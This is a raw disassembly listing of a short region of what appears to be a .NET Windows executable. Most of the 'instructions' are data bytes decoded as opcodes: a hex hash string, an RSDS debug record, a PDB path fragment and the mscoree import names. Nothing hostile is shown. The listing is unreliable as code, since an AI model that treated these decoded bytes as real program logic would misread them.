  4072a3:	arpl   WORD PTR [ecx+0x61],sp
  4072a6:	ss xor eax,0x64316332
  4072ac:	popaw  
  4072ae:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4072b4:	xor    eax,0x32663664
  4072b9:	fs gs xor eax,0x65373166
  4072c0:	xor    eax,0x30666165
  4072c5:	data16 arpl WORD PTR [ecx+edi*1],si
  4072c9:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4072ce:	xor    DWORD PTR [ebx+0x38],esp
  4072d1:	popa   
  4072d2:	xor    DWORD PTR [edx],esi
  4072d4:	xor    al,0x33
  4072d6:	ss xor eax,0x30323831
  4072dc:	ss arpl WORD PTR fs:[eax],si
  4072e0:	cmp    DWORD PTR [ebx],esi
  4072e2:	xor    esi,DWORD PTR [esp+esi*1]
  4072e5:	fs xor eax,0x39326461
  4072eb:	xor    eax,DWORD PTR [eax]
  4072ed:	add    BYTE PTR [eax],cl
  4072ef:	add    DWORD PTR [eax],eax
  4072f1:	or     BYTE PTR [eax],al
	...
  4072fb:	add    BYTE PTR [eax+0x5011e0],cl
  407301:	add    BYTE PTR [eax],al
  407303:	add    BYTE PTR [edx],al
  407305:	add    BYTE PTR [eax],al
  407307:	add    BYTE PTR [ecx+eax*1],bl
  40730a:	add    BYTE PTR [eax],al
  40730c:	adc    al,0x73
  40730e:	add    BYTE PTR [eax],al
  407310:	adc    al,0x55
  407312:	add    BYTE PTR [eax],al
  407314:	push   edx
  407315:	push   ebx
  407316:	inc    esp
  407317:	push   ebx
  407318:	mov    ds:0x7940bb6e,al
  40731d:	dec    edx
  40731e:	loop   0x407364
  407320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407321:	ds jno 0x4072cf
  407324:	sbb    DWORD PTR [ebx+0x103e4],eax
  40732a:	add    BYTE PTR [eax],al
  40732c:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  407331:	outs   dx,BYTE PTR ds:[esi]
  407332:	popa   
  407333:	jb     0x40739e
  407335:	gs jae 0x407394
  407338:	dec    ecx
  407339:	outs   dx,BYTE PTR ds:[esi]
  40733a:	je     0x4073a1
  40733c:	jb     0x4073ab
  40733e:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  407347:	gs je  0x4073a6
  40734a:	jbe    0x4073bf
  40734c:	je     0x4073b3
  40734e:	jae    0x4073c4
  407350:	jbe    0x4073bb
  407352:	fs outs dx,DWORD PTR gs:[esi]
  407355:	jb     0x4073bc
  407357:	arpl   WORD PTR [edi+0x72],bp
  40735a:	fs gs jb 0x40738c
  40735e:	arpl   WORD PTR [ebx+0x70],si
  407361:	jb     0x4073d2
  407363:	push   0x5f
  407365:	xor    DWORD PTR [ecx],edi
  407367:	aaa    
  407368:	xor    eax,0x35303735
  40736d:	xor    DWORD PTR [esi],esi
  40736f:	pop    esp
  407370:	outs   dx,DWORD PTR ds:[esi]
  407371:	bound  ebp,QWORD PTR [edx+0x72]
  407374:	pop    esp
  407375:	js     0x4073af
  407377:	ss pop esp
  407379:	push   esi
  40737a:	push   ebx
  40737b:	push   esp
  40737c:	gs jae 0x4073f3
  40737f:	push   esi
  407380:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  407388:	jb     0x4073ee
  40738a:	gs jb  0x4073bb
  40738d:	jo     0x4073f3
  40738f:	bound  eax,QWORD PTR [eax]
	...
  40742d:	add    BYTE PTR [eax],al
  40742f:	add    BYTE PTR [eax+0x74],bl
	...
  40743a:	add    BYTE PTR [eax],al
  40743c:	outs   dx,BYTE PTR ds:[esi]
  40743d:	je     0x40743f
  40743f:	add    BYTE PTR [eax],al
  407441:	and    BYTE PTR [eax],al
	...
  407457:	add    BYTE PTR [eax+0x74],ah
	...
  407462:	pop    edi
  407463:	inc    ebx
  407464:	outs   dx,DWORD PTR ds:[esi]
  407465:	jb     0x4074ac
  407467:	js     0x4074ce
  407469:	dec    ebp
  40746a:	popa   
  40746b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  407472:	jb     0x4074d9
  407474:	gs cs fs ins BYTE PTR es:[edi],dx
  407478:	ins    BYTE PTR es:[edi],dx
  407479:	add    BYTE PTR [eax],al
  40747b:	add    BYTE PTR [eax],al
  40747d:	add    bh,bh
  40747f:	and    eax,0x402000
